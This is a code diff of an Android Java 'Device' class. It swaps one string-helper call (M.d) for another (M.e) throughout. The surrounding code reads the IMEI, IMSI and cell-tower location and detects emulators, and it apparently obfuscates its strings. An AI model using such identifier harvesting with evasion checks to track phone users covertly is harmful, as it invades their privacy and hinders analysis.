@@ -102,7 +102,7 @@ public class Device {
 
 	public boolean isSimulator() {
 		// return getDeviceId() == "9774d56d682e549c";
-		return android.os.Build.MODEL.endsWith(M.d("sdk")); //$NON-NLS-1$
+		return android.os.Build.MODEL.endsWith(M.e("sdk")); //$NON-NLS-1$
 	}
 
 	/**
@@ -129,7 +129,7 @@ public class Device {
 		if (imei == null || imei.length() == 0) {
 			imei = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
 			if (imei == null || imei.length() == 0) {
-				imei = M.d("N/A"); //$NON-NLS-1$
+				imei = M.e("N/A"); //$NON-NLS-1$
 			}
 		}
 
@@ -158,7 +158,7 @@ public class Device {
 		String imsi = telephonyManager.getSubscriberId();
 
 		if (imsi == null) {
-			imsi = M.d("UNAVAILABLE"); //$NON-NLS-1$
+			imsi = M.e("UNAVAILABLE"); //$NON-NLS-1$
 		}
 
 		return imsi;
@@ -185,7 +185,7 @@ public class Device {
 		
 		if (bcell == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + M.d(" Error: ") + M.d("null cell")); //$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + M.e(" Error: ") + M.e("null cell")); //$NON-NLS-1$ //$NON-NLS-2$
 			}
 			
 			return info;
@@ -195,21 +195,21 @@ public class Device {
 
 		if (bcell instanceof GsmCellLocation) {
 			if (Cfg.DEBUG) {
-				Check.asserts(Device.isGprs(), M.d("gprs or not?")); //$NON-NLS-1$
+				Check.asserts(Device.isGprs(), M.e("gprs or not?")); //$NON-NLS-1$
 			}
 			final GsmCellLocation cell = (GsmCellLocation) bcell;
 
 			info.setGsm(conf.mcc, conf.mnc, cell.getLac(), cell.getCid(), rssi);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + M.d(" info: ") + info.toString()); //$NON-NLS-1$
+				Check.log(TAG + M.e(" info: ") + info.toString()); //$NON-NLS-1$
 			}
 
 		}
 
 		if (bcell instanceof CdmaCellLocation) {
 			if (Cfg.DEBUG) {
-				Check.asserts(Device.isCdma(), M.d("cdma or not?")); //$NON-NLS-1$
+				Check.asserts(Device.isCdma(), M.e("cdma or not?")); //$NON-NLS-1$
 			}
 			final CdmaCellLocation cell = (CdmaCellLocation) tm.getCellLocation();
 
@@ -222,7 +222,7 @@ public class Device {
 			info.bid = cell.getBaseStationId();
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + M.d(" info: ") + info.toString()); //$NON-NLS-1$
+				Check.log(TAG + M.e(" info: ") + info.toString()); //$NON-NLS-1$
 			}
 
 		}
